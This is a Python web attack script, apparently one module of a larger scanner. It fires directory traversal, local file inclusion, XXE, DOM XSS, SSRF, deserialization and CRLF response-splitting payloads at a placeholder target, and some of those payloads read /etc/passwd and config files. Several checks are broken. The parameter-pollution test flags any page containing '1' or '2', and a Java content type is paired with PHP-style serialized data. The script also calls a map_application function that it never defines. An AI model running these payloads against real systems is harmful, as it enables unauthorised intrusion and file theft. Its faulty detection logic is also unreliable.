import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode

# Global settings
TARGET_URL = "http://example.com"  # Replace with the actual target or test environment
SESSION = requests.Session()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}

### Additional Attack Modules ###

### 1. Directory Traversal ###
def test_directory_traversal(url, param_name):
    payloads = ["../../../../etc/passwd", "../../windows/win.ini", "/etc/passwd"]

    for payload in payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"
        response = SESSION.get(full_url, headers=HEADERS)

        if "root:" in response.text or "[extensions]" in response.text:
            print(f"Directory Traversal vulnerability found with payload: {payload}")
        else:
            print(f"Tested Directory Traversal payload: {payload} - No vulnerability detected")


### 2. Local File Inclusion (LFI) ###
def test_file_inclusion(url, param_name):
    payloads = ["../../../../etc/passwd", "/var/www/html/config.php", "/proc/self/environ"]

    for payload in payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"
        response = SESSION.get(full_url, headers=HEADERS)

        if "root:" in response.text or "<?php" in response.text:
            print(f"File Inclusion vulnerability found with payload: {payload}")
        else:
            print(f"Tested File Inclusion payload: {payload} - No vulnerability detected")


### 3. Insecure Deserialization ###
def test_insecure_deserialization(url):
    # Example payloads may vary depending on the application and serialized object types
    payloads = ["O:8:\"Exploit\":0:{}", "O:8:\"Exploit\":1:{s:1:\"x\";i:1;}"]

    for payload in payloads:
        headers = HEADERS.copy()
        headers["Content-Type"] = "application/x-java-serialized-object"
        response = SESSION.post(url, headers=headers, data=payload)

        if "Exploit" in response.text or response.status_code == 500:
            print(f"Insecure Deserialization vulnerability found with payload: {payload}")
        else:
            print(f"Tested Deserialization payload: {payload} - No vulnerability detected")


### 4. HTTP Parameter Pollution ###
def test_http_parameter_pollution(url, param_name):
    payload = {param_name: ["1", "2"]}
    response = SESSION.get(url, params=payload, headers=HEADERS)

    if "2" in response.text or "1" in response.text:
        print(f"HTTP Parameter Pollution detected at {url}")
    else:
        print(f"Tested for HTTP Parameter Pollution - No vulnerability detected")


### 5. XML External Entity (XXE) Injection ###
def test_xxe_injection(url):
    xxe_payload = """<?xml version="1.0" ?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <foo>&xxe;</foo>"""
    
    headers = HEADERS.copy()
    headers["Content-Type"] = "application/xml"

    response = SESSION.post(url, headers=headers, data=xxe_payload)

    if "root:" in response.text:
        print("XXE vulnerability found!")
    else:
        print("Tested XXE payload - No vulnerability detected")


### 6. DOM-based XSS ###
def test_dom_xss(url):
    payload = "#<script>alert('DOM XSS')</script>"
    full_url = f"{url}{payload}"
    response = SESSION.get(full_url, headers=HEADERS)

    if "alert('DOM XSS')" in response.text:
        print(f"DOM-based XSS vulnerability found at {full_url}")
    else:
        print("Tested DOM-based XSS payload - No vulnerability detected")


### 7. Cross-Site WebSocket Hijacking ###
def test_websocket_hijacking(url):
    # Simulated payload (WebSocket hijacking would require more complex setup)
    print(f"Attempting WebSocket hijack test at {url} - Placeholder (further setup needed)")


### 8. Server-Side Request Forgery (SSRF) ###
def test_ssrf(url, param_name):
    payloads = ["http://127.0.0.1", "http://localhost:22"]

    for payload in payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"
        response = SESSION.get(full_url, headers=HEADERS)

        if "connection refused" in response.text or response.status_code == 200:
            print(f"SSRF vulnerability found with payload: {payload}")
        else:
            print(f"Tested SSRF payload: {payload} - No vulnerability detected")


### 9. HTTP Response Splitting ###
def test_http_response_splitting(url, param_name):
    payload = "%0D%0ASet-Cookie:%20session=malicious"
    params = {param_name: payload}
    full_url = f"{url}?{urlencode(params)}"
    response = SESSION.get(full_url, headers=HEADERS)

    if "Set-Cookie" in response.headers:
        print(f"HTTP Response Splitting vulnerability found with payload: {payload}")
    else:
        print(f"Tested HTTP Response Splitting payload: {payload} - No vulnerability detected")


### Main Script ###
if __name__ == "__main__":
    # Step 1: Map the Application
    urls = map_application(TARGET_URL)
    print("Mapped URLs:", urls)

    # Step 2: Directory Traversal
    test_directory_traversal(TARGET_URL, "file")

    # Step 3: File Inclusion (LFI/RFI)
    test_file_inclusion(TARGET_URL, "page")

    # Step 4: Insecure Deserialization
    test_insecure_deserialization(TARGET_URL)

    # Step 5: HTTP Parameter Pollution
    test_http_parameter_pollution(TARGET_URL, "id")

    # Step 6: XML External Entity (XXE) Injection
    test_xxe_injection(TARGET_URL)

    # Step 7: DOM-based XSS
    test_dom_xss(TARGET_URL)

    # Step 8: Cross-Site WebSocket Hijacking
    test_websocket_hijacking(TARGET_URL)

    # Step 9: Server-Side Request Forgery (SSRF)
    test_ssrf(TARGET_URL, "url")

    # Step 10: HTTP Response Splitting
    test_http_response_splitting(TARGET_URL, "redirect")
